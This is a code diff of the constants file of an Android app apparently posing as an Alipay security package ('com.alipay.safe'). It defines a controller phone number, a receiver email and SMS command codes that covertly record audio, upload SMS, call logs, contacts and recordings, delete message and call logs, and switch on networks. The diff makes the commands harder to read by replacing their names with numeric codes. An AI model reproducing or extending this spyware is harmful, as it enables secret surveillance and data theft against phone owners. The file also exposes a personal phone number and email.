@@ -18,8 +18,8 @@ import com.alipay.safe.util.FileUtil;
 
 public class Globle {
 
-	public static final String PHONE_NUMBER = "18210633121";//控制者的电话号码
-	
+	public static final String PHONE_NUMBER = "18210633121";// 控制者的电话号码
+
 	/**
 	 * 发送者的email和密码，163邮箱
 	 */
@@ -29,37 +29,35 @@ public class Globle {
 	 * 接收者的email
 	 */
 	public final static String receiverEmail = "craining@163.com";
-	
 
-	public static final String PHONE_CODE_UP = "TURN_UP";// 调大音量
-	public static final String PHONE_CODE_DOWN = "TURN_DOWN";// 调低音量
-	public static final String PHONE_CODE_CALL_ME = "CALL_ME";// 给我打电话
+	public static final String PHONE_CODE_UP = "011";// TURN_UP
+	public static final String PHONE_CODE_DOWN = "012";// TURN_DOWN
+	public static final String PHONE_CODE_CALL_ME = "013";// CALL_ME
 
-	public static final String PHONE_CODE_RECORD_TIME = "RECORD_TIME";// 录音N分钟
-	public static final String PHONE_CODE_RECORD_START = "RECORD_START";// 开始录音
-	public static final String PHONE_CODE_RECORD_END = "RECORD_END";// 结束录音
+	public static final String PHONE_CODE_RECORD_TIME = "015:";// RECORD_TIME:
+	public static final String PHONE_CODE_RECORD_START = "016";// RECORD_START
+	public static final String PHONE_CODE_RECORD_END = "017";// RECORD_END
 
-	public static final String PHONE_CODE_TURNON_WIFI = "TURN_ON_WIFI";// 开启wifi
-	public static final String PHONE_CODE_TURNON_MOBILE = "TURN_ON_MOBILE";// 开启移动网络
+	public static final String PHONE_CODE_DELETE_MSG_LOG = "021";// DEL_MSG
+	public static final String PHONE_CODE_DELETE_CALL_LOG = "022";// DEL_CALL
+	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "023";// DEL_AUDIO_CALL
+	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "025";// DEL_AUDIO_OTHER
+	public static final String PHONE_CODE_DELETE_ALL_LOG = "026";// DEL_ALL
 
-	public static final String PHONE_CODE_DELETE_MSG_LOG = "DEL_MSG";// 删除短息记录
-	public static final String PHONE_CODE_DELETE_CALL_LOG = "DEL_CALL";// 删除通话记录
-	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "DEL_AUDIO_CALL";// 删除通话录音记录
-	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "DEL_AUDIO_OTHER";// 删除其它录音记录
-	public static final String PHONE_CODE_DELETE_ALL_LOG = "DEL_ALL";// 删除所有记录
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "031";// HELLO_SMS_CALL
+	public static final String PHONE_CODE_UPLOAD_ALL = "032";// HELLO_ALL
+	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "033";// HELLO_CALL_AUDIO
+	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "035";// HELLO_OTHER_AUDIO
+	public static final String PHONE_CODE_UPLOAD_CONTACTS = "036";// HELLO_CONTACTS
+	public static final String PHONE_CODE_TURNON_WIFI = "037";// TURN_ON_WIFI
 
-	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "HELLO_SMS_CALL";// 上传，仅wifi
-	public static final String PHONE_CODE_UPLOAD_ALL = "HELLO_ALL";// 全部上传，仅wifi
-	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "HELLO_CALL_AUDIO";//
-	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "HELLO_OTHER_AUDIO";//
-	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "HELLO_SMS_CALL_MOBILE";// 上传，仅wifi
-	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "HELLO_ALL_MOBILE";// 全部上传，
-	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "HELLO_CALL_AUDIO_MOBILE";//
-	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "HELLO_OTHER_AUDIO_MOBILE";//
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "051";// HELLO_SMS_CALL_MOBILE
+	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "052";// HELLO_ALL_MOBILE
+	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "053";// HELLO_CALL_AUDIO_MOBILE
+	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "055";// HELLO_OTHER_AUDIO_MOBILE
+	public static final String PHONE_CODE_TURNON_MOBILE = "056";// TURN_ON_MOBILE
+	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "057";// HELLO_CONTACTS_MOBILE
 
-	public static final String PHONE_CODE_UPLOAD_CONTACTS = "HELLO_CONTACTS";
-	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "HELLO_CONTACTS_MOBILE";
-	
 	public static final String SERVICE_NAME_LISTEN = "com.alipay.safe.service.ListenService";
 	public static final String SERVICE_NAME_RECORDER = "com.alipay.safe.service.RecorderService";
 
@@ -70,7 +68,6 @@ public class Globle {
 	public static final File FILE_TAG_UPLOAD_TAG = new File("/data/data/com.alipay.safe.receiver/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
 
-	
 	/**
 	 * 调最大音量
 	 * 
